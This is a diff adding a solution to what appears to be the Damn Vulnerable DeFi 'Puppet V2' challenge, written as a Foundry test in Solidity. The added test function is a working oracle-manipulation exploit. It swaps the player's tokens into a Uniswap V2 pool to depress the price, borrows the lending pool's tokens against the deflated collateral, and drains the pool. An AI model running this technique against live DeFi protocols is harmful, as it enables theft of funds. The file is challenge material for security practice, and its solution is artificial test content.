@@ -97,8 +97,50 @@ contract PuppetV2Challenge is Test {
     /**
      * CODE YOUR SOLUTION HERE
      */
+    // 10 WETH / 100 DVT (Uniswap) 20 WETH / 10000 DVT (Player)
+    // 0.1 WETH / 10000 DVT (Uniswap) 29.9 WETH / 100 DVT (Player)
+    // First borrow : 9.9 * 10 * 10000 / 3 = 330000
+    // 0.0023255813953488 WETH / 430000 DVT (Uniswap) 
+    // Second borrow all money in the pool
+    // And buy the WETH back with the remaining DVT
+    
     function test_puppetV2() public checkSolvedByPlayer {
-        
+        token.approve(address(uniswapV2Router), type(uint256).max);
+        address[] memory path = new address[](2);
+        path[0] = address(token);
+        path[1] = address(weth);
+        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens({
+            amountIn: PLAYER_INITIAL_TOKEN_BALANCE,
+            amountOutMin: 0,
+            path: path,
+            to: player,
+            deadline: block.timestamp
+        });
+        weth.approve(address(lendingPool), type(uint256).max);
+        lendingPool.borrow(330000 ether);
+        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens({
+            amountIn: token.balanceOf(player),
+            amountOutMin: 0,
+            path: path,
+            to: player,
+            deadline: block.timestamp
+        });
+
+        lendingPool.borrow(token.balanceOf(address(lendingPool)));
+        console.log("Player WETH balance: ", weth.balanceOf(player));
+        weth.approve(address(uniswapV2Router), type(uint256).max);
+        address[] memory path2 = new address[](2);
+        path2[0] = address(weth);
+        path2[1] = address(token);
+        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens({
+            amountIn: weth.balanceOf(player),
+            amountOutMin: 0,
+            path: path2,
+            to: player,
+            deadline: block.timestamp
+        });
+
+        token.transfer(recovery, 1000000000000000000000000);
     }
 
     /**
